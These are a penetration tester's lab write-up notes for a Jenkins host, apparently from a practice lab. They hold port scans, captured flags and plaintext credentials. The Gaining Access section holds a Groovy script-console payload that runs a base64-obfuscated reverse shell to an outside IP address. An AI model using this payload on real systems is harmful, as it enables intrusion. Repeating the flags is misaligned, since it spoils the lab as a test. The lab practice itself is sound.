# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings
### Credentials
`FoundCREDs`

### Flag
- `DANTE{to_g0_4ward_y0u_mus7_g0_back}`
- `DANTE{g0tta_<3_ins3cur3_GROupz!}`
## External
### Enumeration
```shell
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.41
|_http-title: Index of /
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    syn-ack ttl 64 Jetty 9.4.27.v20200227
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
Service Info: Host: 127.0.0.1
```
![](https://i.imgur.com/ObexQP5.png)

![](https://i.imgur.com/MNWL5Wn.png)
- I Coudn't Get any Exploit for this version of this `jenkins`
![](https://i.imgur.com/WvwPYBS.png)
- so Bruteforce or Leak.
Using Credentials from [[Dante - DC02]] `Admin_129834765 : SamsungOctober102030`
![](https://i.imgur.com/faQbSBm.png)
### Gaining Access
![](https://i.imgur.com/1DIuGEa.png)
- Jenkins RCE
```shell
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0MDIgMD4mMScK}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
![](https://i.imgur.com/sE9D6j9.png)
## Internal
### Enumeration
![](https://i.imgur.com/dDYqi1V.png)
![](https://i.imgur.com/jr05Qyp.png)
![](https://i.imgur.com/UWp1luQ.png)
- `/bin/bash mysql -u ian -p VPN123ZXC`
![](https://i.imgur.com/smpx9k3.png)
### Gaining Access
- The user has `disk` group permission
![](https://i.imgur.com/h0WdHoN.png)


### Maintaining Access


# Random Notes